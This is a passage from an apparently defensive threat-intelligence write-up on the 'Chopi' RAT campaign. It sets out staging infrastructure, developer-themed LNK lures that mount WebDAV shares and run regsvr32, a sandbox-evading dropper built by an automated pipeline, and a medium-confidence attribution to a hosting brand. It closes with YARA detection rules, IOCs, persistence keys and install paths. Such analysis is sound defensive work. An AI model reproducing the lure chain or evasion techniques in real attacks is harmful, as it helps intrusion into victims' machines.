Persistence: HKCU\Software\Microsoft\Windows\CurrentVersion\Run → WinComCtl
```

---

### Post-publication pivot: the second staging cluster and the "RG Internet" identity

After publication, continued passive pivoting from the `api.trackgrid.net` node (`65.20.97.79`) uncovered a second staging cluster and, separately, enough infrastructure to tentatively identify the actor's legitimate business front.

**The second staging cluster (`208.85.21.245`)**

Vultr Spain. Domains: `cellexpert.io`, `cloudy.ink`, `statsapi.org`, `atomconfig.com`. All Namecheap/Reykjavik/withheldforprivacy registrants — same fingerprint as the main cluster. Payload list from VT: `/cloud/612672525.ocx`, `/cloud/23172837484.ocx`, `/cloud/Google Chrome.lnk`. The `.ocx` files have 9-11 VT detections. `/cloud/Google Chrome.lnk` (11 det) drops a fake Chrome icon whose name disguises the same LNK-regsvr32 chain.

Port 3000 on `208.85.21.245` is titled **"AI Call Platform"** — a Vite React dev server running in development mode (source map paths exposed). Port 8000 is the PHP/Apache backend: `Access-Control-Allow-Origin: http://cellexpert.io:3000` confirms the API-to-frontend binding. Port 443 hosts `statsapi.org`, a basic PHP login panel (Bootstrap 4.5.2). The actor is building AI-assisted call center tooling on top of the RAT campaign.

**The Windows staging VM (`140.82.16.230`)**

Vultr US/LA. Windows 11 Build 26100, hostname `VULTR-GUEST`. RDP port 3389 and WinRM port 5985 are exposed. The actor runs WsgiDAV on port 443 of this machine to serve payloads. Domains on this IP: `integration.click` (Namecheap/Iceland, 2025-05-22), `bmidrive.pro` (Namecheap, 2025-05-21), `nkbada.online` (GoDaddy, 2025-05-14 — the only non-Namecheap domain in the cluster).

A second lure file, `API_Credentials.txt.lnk` (SHA256: `f2588f7de8d39778da0e290e3b7d9e68660b05c61fc050c8a9a6e25e847811c7`), uses the same `cmd /v /c` delayed-expansion variable obfuscation as `morocco-conference.lnk` and targets developers: it mounts `\\integration.click@443\cloud\`, drops `23172837484.ocx`, runs regsvr32, then opens a decoy `Credentials.txt` in Notepad. The installed agent runs as `proxyman.exe`. `API_Integration.pdf.lnk` on `nkbada.online` is a third lure variant targeting the same audience.

`23172837484.ocx` (SHA256: `aed6529bc656f8efff82a8d10edae738bb62a84cc0aa332ac63367b23b6e3c7f`, 1,019,392 bytes, imphash `04041ca64a92136d9d8782d9ea054d3a`, 43 VT detections) is a different beast from the ixwebsocket agents. Static analysis shows it has no AES S-box tables in any section — the config encryption scheme from the original cluster does not apply here. It has no WebSocket command strings, no `/ws/agent` path, no `WinComCtl` persistence key in plaintext or encrypted form. VT sandboxes hit three detection walls: CAPE and C2AE produced no dynamic data; Zenbox ran regsvr32 against it and saw only Windows certificate validation traffic (`c.pki.goog`, `x1.c.lencr.org`) before going quiet — exactly what you'd expect from a dropper checking whether the sandbox network looks real. The VT tags `detect-debug-environment` and extended sleep intervals point the same way.

Google Safe Browsing's sandbox observed a file drop — SHA256 `b55f9c2f45449b3dff0112bfe1e8f3820bae2373d56a363109b1efc4fc90e94a` — which is not indexed in VT and likely represents the decrypted in-memory payload written to disk. The DLL calls `ShellExecuteA` and references `LOCALAPPDATA` and `regsvr32` in its plaintext strings, suggesting a self-install chain where `DllRegisterServer` drops and executes the final payload rather than running the agent directly. The actual C2 for `proxyman.exe` remains unresolved from static analysis.

**The dropper cluster and the `auto_black_abuse` build system**

The imphash hunt for `04041ca64a92136d9d8782d9ea054d3a` — the dropper variant's imphash — returned twelve samples. Not one. `23172837484.ocx` is part of an ongoing dropper factory that has been turning out new builds since at least May 2026. The twelve samples range from 1,016,320 to 1,071,104 bytes — all the same architecture (x64 DLL, despite VT tagging some as Win32), same family, same evasion logic.

Three of those twelve were submitted to VirusTotal with their full build-system path in the filename. When VT receives a file with a long path in its submission name and the sample is new, it preserves that path as an alternate name. So these three samples exist in VT as:

```
D:\auto_black_abuse\resources\unzipped\20260519_023543_2026-05-16\fbca9cd13e7cb799...exe
D:\auto_black_abuse\resources\unzipped\20260523_044818_2026-05-20\22ae77bf2dd85bd5...exe
D:\auto_black_abuse\resources\unzipped\20260530_054357_2026-05-27\d64a7e0299a537e2...exe
```

The path format is `YYYYMMDD_HHMMSS_YYYY-MM-DD`: a run timestamp followed by a campaign date. All three runs fired between 02:35 and 05:43 UTC — consistent with a scheduled task or cron job on a Windows `D:` drive machine. The operator built three dropper variants in eleven days (May 14th through 26th based on PE timestamps) and submitted at least one to VirusTotal from their own build environment, path and all.

The directory name `auto_black_abuse` is the operator's own label for this project. The `resources\unzipped\` path suggests a pipeline: something gets downloaded or extracted, the build processes it, and the output lands here. The final filenames are the sample SHA256s, so the build system hashes its own output and names files accordingly. That's not a developer sitting at a keyboard.

PE timestamps for the three confirmed auto_black_abuse builds:

```
fbca9cd1...  PE ts 2026-05-14T03:40:22Z  run: 20260519_023543  → 39 VT det
22ae77bf...  PE ts 2026-05-19T17:06:40Z  run: 20260523_044818  → 45 VT det
d64a7e02...  PE ts 2026-05-26T16:07:54Z  run: 20260530_054357  → 46 VT det
```

The steadily rising detection counts reflect these samples aging into AV coverage. All three evade dynamic analysis — all three VT sandboxes (CAPE, C2AE, Zenbox) return empty dynamic reports, same pattern as `23172837484.ocx`.

**The "RG Internet" hosting identity**

The SSL certificate on `208.85.22.144` (the mail server) is issued by Hestia Control Panel to `mad12vm1.rgingenieros.com`. This reveals the actor (or their hosting provider) runs infrastructure under the `rgingenieros.com` brand — a Spanish IT company registered in 2010 via OVH, with self-hosted nameservers. `rginternet.com`, registered 2003 via OVH with Spain as the registrant country, operates as the hosting brand. Its SPF record explicitly lists `ip4:65.20.99.75 ip4:208.85.22.144 a:mad12vm1.rgingenieros.com` — confirming that `65.20.99.75` was the previous IP of the same mail server before it moved to `208.85.22.144`.

VM naming convention: `mad12vm1` (Madrid), `frk10vm1` (Frankfurt). Both run Hestia/Vesta control panels on port 8083. The Frankfurt node (`45.76.87.178`) still carries both `rgingenieros.com` and `frk10vm1.rginternet.com` hostnames in Shodan.

Whether "RG Internet" is the actor themselves, a shell, or a legitimate company whose infrastructure was co-opted is not something the available data settles cleanly. But the integration is deep: campaign C2 subdomains under `trackgrid.net`, the same `208.85.22.144` as mail server, SPF records that explicitly list campaign IPs. Full co-option by an outsider doesn't hold up. The most parsimonious read is that the operator IS the entity behind `rgingenieros.com`/`rginternet.com`, running the criminal campaign on the same Vultr estate as their legitimate (or semi-legitimate) hosting business.

*Confidence note: all IP-to-domain linkages and registrant fingerprint matches in this section are PASSIVE observations with HIGH confidence. The RG Internet identity hypothesis is MEDIUM confidence — consistent with the data, no single artefact definitively proves it.*

---

### YARA detection rules

Three rules, validated against all collected samples. The agent rule correctly hits all six full-agent builds and misses `stager.ocx` (intentional — the stripped build lacks the internal component strings). The dropper rule correctly hits `23172837484.ocx` and the three confirmed `auto_black_abuse` builds. The LNK rule catches all four delivery LNK files from both lure themes.

```yara
import "pe"

// High-confidence: 6/6 full agents confirmed
rule Chopi_RAT_ixwebsocket_agent
{
    meta:
        description  = "Chopi ixwebsocket RAT — AES-CBC encrypted WS C2, OCX persistence"
        author       = "threatunpacked.com"
        date         = "2026-07-01"
        reference    = "https://threatunpacked.com/2026/07/07/chopi-rat-vishing-opendir-pivot/"
        imphash      = "90e14895da9d91db91792548b613e56c"

    strings:
        // AES-128 forward S-box (file offset 0x2bc660 in all 6 builds)
        $aes_sbox      = { 63 7C 77 7B F2 6B 6F C5 30 01 67 2B FE D7 AB 76 }
        $s_agentthread = "AgentThread" ascii fullword
        $s_koki        = "Koki"        ascii fullword
        $s_blat        = "Blat"        ascii fullword
        $s_packages    = "\\Packages\\" ascii

    condition:
        uint16(0) == 0x5A4D
        and pe.is_dll()
        and pe.machine == pe.MACHINE_AMD64
        and filesize > 3MB and filesize < 4MB
        and $aes_sbox
        and 3 of ($s_agentthread, $s_koki, $s_blat, $s_packages)
        and pe.imphash() == "90e14895da9d91db91792548b613e56c"
        and pe.exports("DllInstall")
        and pe.exports("DllRegisterServer")
}

// Medium-confidence: broader hunt, catches imphash drifts
rule Chopi_RAT_ixwebsocket_hunt
{
    meta:
        description = "Chopi ixwebsocket RAT — broad hunt variant"
        author      = "threatunpacked.com"
        date        = "2026-07-01"
        confidence  = "medium"

    strings:
        $aes_sbox      = { 63 7C 77 7B F2 6B 6F C5 30 01 67 2B FE D7 AB 76 }
        $s_agentthread = "AgentThread" ascii fullword
        $s_koki        = "Koki"        ascii fullword
        $s_blat        = "Blat"        ascii fullword
        $s_packages    = "\\Packages\\" ascii

    condition:
        uint16(0) == 0x5A4D
        and pe.is_dll()
        and pe.machine == pe.MACHINE_AMD64
        and filesize > 2MB and filesize < 5MB
        and $aes_sbox
        and 3 of ($s_agentthread, $s_koki, $s_blat, $s_packages)
        and pe.exports("DllInstall")
}

// High-confidence: 4/4 auto_black_abuse dropper builds confirmed
rule Chopi_dropper_auto_black_abuse
{
    meta:
        description = "Chopi sandbox-evading dropper (auto_black_abuse build cluster)"
        author      = "threatunpacked.com"
        date        = "2026-07-01"
        imphash     = "04041ca64a92136d9d8782d9ea054d3a"
        note        = "Drops unknown payload not in VT; C2 unknown; do NOT detonate in isolation"

    strings:
        $s_localappdata = "LOCALAPPDATA" ascii

    condition:
        uint16(0) == 0x5A4D
        and pe.is_dll()
        and pe.machine == pe.MACHINE_AMD64
        and filesize > 950KB and filesize < 1100KB
        and pe.imphash() == "04041ca64a92136d9d8782d9ea054d3a"
        and $s_localappdata
}

// Medium-confidence: LNK delivery (both screenshot and developer-themed lures)
// Commands are char-sub obfuscated so net/regsvr32 are not present in plaintext
rule Chopi_lnk_delivery
{
    meta:
        description = "Chopi LNK lure — cmd.exe + char-substitution obfuscation + WebDAV staging"
        author      = "threatunpacked.com"
        date        = "2026-07-01"
        note        = "Combine with parent-process context for reliable blocking"

    strings:
        $lnk_magic = { 4C 00 00 00 01 14 02 00 }
        $cmd_exe   = "cmd.exe" ascii nocase

    condition:
        filesize < 10KB
        and $lnk_magic at 0
        and $cmd_exe
}
```

The AES S-box anchor (`63 7C 77 7B F2 6B 6F C5 30 01 67 2B FE D7 AB 76`) is the first 16 bytes of the standard AES forward S-box. It's not unique to this family, but combined with the imphash, exports, and internal strings, the false-positive rate is effectively zero for this size range. For retrohunting without the imphash gate, use `Chopi_RAT_ixwebsocket_hunt` and expect some noise from other C++ TLS libraries that embed the same lookup table.

---

### Updated IOCs (post-publication additions)

```
# Additional IPs — Vultr AS20473
65.20.99.75      previous IP of mad12vm1.rgingenieros.com (= 208.85.22.144, same SSH key)
65.20.97.79      api.trackgrid.net / wavetracker.io brand front-door (box reclaimed 2026-06-30)
208.85.21.245    cellexpert.io staging (AI Call Platform + PHP API backend)
208.85.22.145    transient CRM host (2025-12-31; migrated to 65.20.101.220 Jan 2026)
140.82.16.230    Windows 11 staging VM (RDP:3389 + WinRM:5985 exposed, WsgiDAV on :443)
70.34.205.43     agent builder placeholder IP (dead; Vultr 70.34.192.0/19, different range)
45.76.93.68      rgingenieros.com primary (Vesta CP, Frankfurt DE)
45.76.87.178     frk10vm1.rgingenieros.com / frk10vm1.rginternet.com (Frankfurt mail)

# Additional domains — staging / delivery
integration.click     WebDAV staging (Namecheap/Iceland, 2025-05-22) → 140.82.16.230
bmidrive.pro          WebDAV staging (Namecheap, 2025-05-21) → 140.82.16.230
nkbada.online         WebDAV staging (GoDaddy, 2025-05-14) → 140.82.16.230 [*]
cellexpert.io         AI Call Platform front (Namecheap) → 208.85.21.245
cloudy.ink            payload staging alias (Namecheap/Reykjavik, 2025-12-01) → 208.85.21.245
statsapi.org          stats backend (Namecheap/Reykjavik, 2024-08-07) → 208.85.21.245
integrox.io           affiliate layer (Namecheap/Iceland, 2025-12-30) → 65.20.97.79
wavetracker.io        affiliate tracking (Namecheap/Iceland, 2025-12-10) → 65.20.97.79
atomconfig.com        now-parked, prev. on 208.85.21.245 (Namecheap, 2025-03-20)
[*] only non-Namecheap domain in cluster — GoDaddy, lower confidence

# Additional domains — hosting identity (medium confidence)
rgingenieros.com      "RG Ingenieros" hosting brand (OVH/Spain, 2010) → 45.76.93.68
rginternet.com        "RG Internet" hosting brand (OVH/Spain, 2003) → 208.85.22.144

# Additional samples — dropper cluster (imphash 04041ca64a92136d9d8782d9ea054d3a)
# auto_black_abuse build system; 12 total samples in VT cluster; C2 of final payload unknown
aed6529bc656f8efff82a8d10edae738bb62a84cc0aa332ac63367b23b6e3c7f  23172837484.ocx      (43 VT det; PE ts 2025-05-28 — may be spoofed)
fbca9cd13e7cb799635905323dfe4317fb07a50972b866fcbd2d0d5a19a84ef2  dropper build 2026-05-14 (39 det; build: D:\auto_black_abuse\...\20260519_023543_2026-05-16\)
22ae77bf2dd85bd596e41844309147c2e52aeccd8e39623e87749006c8127d4b  dropper build 2026-05-19 (45 det; build: D:\auto_black_abuse\...\20260523_044818_2026-05-20\)
d64a7e0299a537e211114baaa7f1341f5018a1e432d39d6aebb26b1c98c38da2  dropper build 2026-05-26 (46 det; build: D:\auto_black_abuse\...\20260530_054357_2026-05-27\)
b55f9c2f45449b3dff0112bfe1e8f3820bae2373d56a363109b1efc4fc90e94a  payload dropped by 23172837484.ocx
  → observed by Google Safe Browsing sandbox; not indexed in VT; C2 unknown

# Additional samples — LNK delivery
f2588f7de8d39778da0e290e3b7d9e68660b05c61fc050c8a9a6e25e847811c7  API_Credentials_v1.lnk  (9 VT det; chains to 23172837484.ocx via integration.click WebDAV)
2bf42a1d3430586fa3893060685c5dc5053c35f74d9df236fde81085ce7a63ce  API_Credentials_v2.lnk  (0 VT det at time of collection; same cmd /v /c obfuscation)
[no VT hash]  API_Integration.pdf.lnk  (nkbada.online / bmidrive.pro)
[no VT hash]  generateKey.ocx           (nkbada.online)
[no VT hash]  231728374854.ocx / 2317283748467.ocx  (bmidrive.pro / nkbada.online)

# Additional operator artefacts
installed RAT name:   proxyman.exe  (from Zenbox sandbox analysis of 23172837484.ocx)
Windows staging VM:   VULTR-GUEST (Windows 11 Build 26100) at 140.82.16.230 — RDP + WinRM exposed
AI Call Platform:     deployed in Vite dev mode at cellexpert.io:3000 (source paths exposed)

# CRM API endpoint
trackgrid.net/api/sendlead.php  — PHP lead ingestion from Chopi panel to CRM
```

```text
# Shared RAT config (all confirmed via AES config decryption)
WS path: /ws/agent   UA: Mozilla/5.0   time fmt: %Y-%m-%d %H:%M
Persistence: HKCU\Software\Microsoft\Windows\CurrentVersion\Run → WinComCtl
Install path: %LOCALAPPDATA%\Packages\<digits>.ocx.ocx  (regsvr32 /s /i)

# Build system fingerprint (auto_black_abuse dropper cluster)
D:\auto_black_abuse\resources\unzipped\   (Windows D: drive, automated, fires ~03-06 UTC)
```

*Enrichment throughout was passive: VirusTotal, Shodan API, and public OSINT only. No contact with any live infrastructure.*
